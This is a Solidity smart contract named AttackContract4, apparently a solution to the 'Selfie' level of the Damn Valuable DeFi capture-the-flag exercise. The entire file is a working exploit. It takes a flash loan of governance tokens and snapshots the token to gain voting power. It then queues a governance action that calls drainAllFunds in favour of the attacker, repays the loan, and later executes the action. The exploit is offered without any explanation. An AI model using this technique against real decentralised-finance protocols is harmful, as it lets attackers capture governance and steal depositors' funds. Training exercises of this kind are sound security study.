// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract AttackContract4 {

    using Address for address;

    DamnValuableTokenSnapshot token;

    SelfiePool selfiePool;
    SimpleGovernance governance;

    address public attacker;
    uint256 public actionId;

    constructor(
        address _selfiePool,
        address _governance,
        address _attacker
    ) {
        selfiePool = SelfiePool(_selfiePool);
        governance = SimpleGovernance(_governance);
        attacker = _attacker;
    }

    function receiveTokens(address _token, uint256 amount) public {
        token = DamnValuableTokenSnapshot(_token);
        // snapshot
        token.snapshot();
        // make data
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        // governance.queueAction
        actionId = governance.queueAction(address(selfiePool), data, 0);
        // token.transfer(msg.sender, amount)
        token.transfer(address(selfiePool), amount);
    }

    function withdraw() public {
        governance.executeAction(actionId);
    }

    function attack(uint256 amount) public {
        selfiePool.flashLoan(amount);
    }
}